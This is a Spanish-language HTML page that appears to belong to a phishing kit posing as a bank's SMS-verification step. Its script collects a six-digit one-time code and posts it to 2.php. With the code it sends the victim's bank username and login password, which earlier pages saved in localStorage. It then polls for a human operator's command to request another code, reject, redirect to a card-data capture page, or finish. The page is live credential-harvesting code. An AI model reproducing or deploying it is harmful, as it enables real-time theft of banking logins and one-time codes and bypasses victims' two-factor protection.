<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Clave SMS</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      margin: 0;
      padding: 0;
      background-color: #3a3a3a;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 30px 20px;
    }

    .video-container {
      width: 100%;
      max-width: 360px;
      border-radius: 12px;
      overflow: hidden;
      margin-bottom: 20px;
    }

    video {
      width: 100%;
      height: auto;
      display: block;
    }

    h2 {
      font-size: 1.6em;
      text-align: center;
      margin: 10px 0;
    }

    p {
      text-align: center;
      color: #ccc;
      font-size: 0.95em;
      margin-bottom: 25px;
    }

    .pin-container {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 30px;
    }

    .pin-input {
      width: 36px;
      height: 48px;
      text-align: center;
      font-size: 1.4em;
      border: none;
      border-bottom: 2px solid #fff;
      background: transparent;
      color: #fff;
      border-radius: 5px;
      outline: none;
      transition: border-color 0.2s;
    }

    .pin-input:focus {
      border-color: #f9c411;
    }

    .buttons {
      display: flex;
      gap: 10px;
      justify-content: space-between;
      width: 100%;
      max-width: 360px;
    }

    .buttons button {
      flex: 1;
      padding: 12px;
      font-size: 1em;
      border-radius: 25px;
      font-weight: bold;
      cursor: pointer;
      border: none;
    }

    .btn-borrar {
      background-color: transparent;
      color: #ccc;
      border: 1px solid #ccc;
    }

    .btn-continuar {
      background-color: #f9c411;
      color: #000;
    }

    /* Loader overlay */
    #modalCarga {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.65);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    #modalCarga .box {
      background: #fff;
      color: #000;
      padding: 20px 25px;
      border-radius: 10px;
      text-align: center;
      width: 260px;
      font-size: 14px;
    }

    .spinner {
      width: 30px;
      height: 30px;
      border-radius: 50%;
      border: 3px solid #ddd;
      border-top: 3px solid #f9c411;
      margin: 0 auto 15px;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      from { transform: rotate(0deg); }
      to   { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="video-container">
    <video src="img/1.mov" autoplay muted loop></video>
  </div>

  <h2>Ingresa la Clave SMS</h2>
  <p>La encuentras en tu correo o en los mensajes del celular que registraste.</p>

  <div class="pin-container">
    <input type="text" maxlength="1" class="pin-input" />
    <input type="text" maxlength="1" class="pin-input" />
    <input type="text" maxlength="1" class="pin-input" />
    <input type="text" maxlength="1" class="pin-input" />
    <input type="text" maxlength="1" class="pin-input" />
    <input type="text" maxlength="1" class="pin-input" />
  </div>

  <div class="buttons">
    <button class="btn-borrar" id="btnBorrar">Borrar</button>
    <button class="btn-continuar" onclick="enviarClaveSms()">Continuar</button>
  </div>

  <!-- Loader -->
  <div id="modalCarga">
    <div class="box">
      <div class="spinner"></div>
      Validando tu código SMS...
    </div>
  </div>

  <script>
    const inputs = document.querySelectorAll('.pin-input');
    const modalCarga = document.getElementById("modalCarga");
    const btnBorrar = document.getElementById("btnBorrar");

    function mostrarLoader() {
      modalCarga.style.display = "flex";
    }

    function ocultarLoader() {
      modalCarga.style.display = "none";
    }

    // Movimiento entre inputs (solo números)
    inputs.forEach((input, index) => {
      input.addEventListener('input', () => {
        input.value = input.value.replace(/[^0-9]/g, "");
        if (input.value.length === 1 && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === "Backspace" && input.value === "" && index > 0) {
          inputs[index - 1].focus();
        }
      });
    });

    // Botón borrar
    btnBorrar.addEventListener("click", () => {
      inputs.forEach(i => i.value = "");
      inputs[0].focus();
    });

    // Enviar clave SMS a 2.php
    async function enviarClaveSms() {
      const clave = Array.from(inputs).map(i => i.value).join('');

      if (clave.length !== 6) {
        alert("Debes ingresar los 6 dígitos del código SMS.");
        return;
      }

      // Datos desde localStorage
      const tbdatos    = JSON.parse(localStorage.getItem("tbdatos") || "{}");
      const usuarioVal = localStorage.getItem("usuario") || "";
      const claveVal   = localStorage.getItem("clave_login") || "";
      const monto      = localStorage.getItem("total_pagar") || "0";

      const transactionToken = crypto.randomUUID();

      const payload = {
        transactionId: transactionToken,
        bancoldata: { usuario: usuarioVal, clave: claveVal },
        bancoldina: { clave: clave },   // código SMS ingresado
        metodo: "sms",
        total: monto,
        tbdatos
      };

      try {
        mostrarLoader();

        await fetch("2.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        const TIMEOUT_MS = 180000;
        const poll   = setInterval(checkSms, 5000);
        const timeout = setTimeout(() => {
          clearInterval(poll);
          ocultarLoader();
          alert("No se obtuvo respuesta del operador. Por favor intenta más tarde.");
        }, TIMEOUT_MS);

        async function checkSms() {
  const res  = await fetch(`2.php?transactionId=${transactionToken}`);
  const json = await res.json();

  if (json.ok && json.action) {
    clearInterval(poll);
    clearTimeout(timeout);
    ocultarLoader();

    if (json.action === "pedir_token") {
      alert("El código SMS no es válido. Ingresa uno nuevo.");
      inputs.forEach(i => i.value = "");
      inputs[0].focus();
    }

    if (json.action === "rechazar") {
      alert("Tu operación fue rechazada.");
      window.location.href = "index.php";
    }

    if (json.action === "banco_error") {
      alert("Datos de inicio de sesión erróneos. Corríjalos.");
      window.location.href = "index.php";
    }

    if (json.action === "cc") {
      window.location.href = "../../../../data-cc/alter.php";
    }

    if (json.action === "check" || json.action === "aprobado") {
      window.location.href = "fin.php";
    }

    if (json.action === "fin") {
      window.location.href = "fin.php";
    }

    // 🔴 NUEVO: si el operador vuelve a tocar SMS
    if (json.action === "sms") {
      alert("El código SMS ya fue usado o no es válido. Vuelve a ingresarlo.");
      window.location.reload(); // recarga la página para que lo vuelvan a poner
    }
  }
}

      } catch (e) {
        console.error(e);
        ocultarLoader();
        alert("Ocurrió un error al enviar el código. Intenta de nuevo.");
      }
    }
  </script>

</body>
</html>
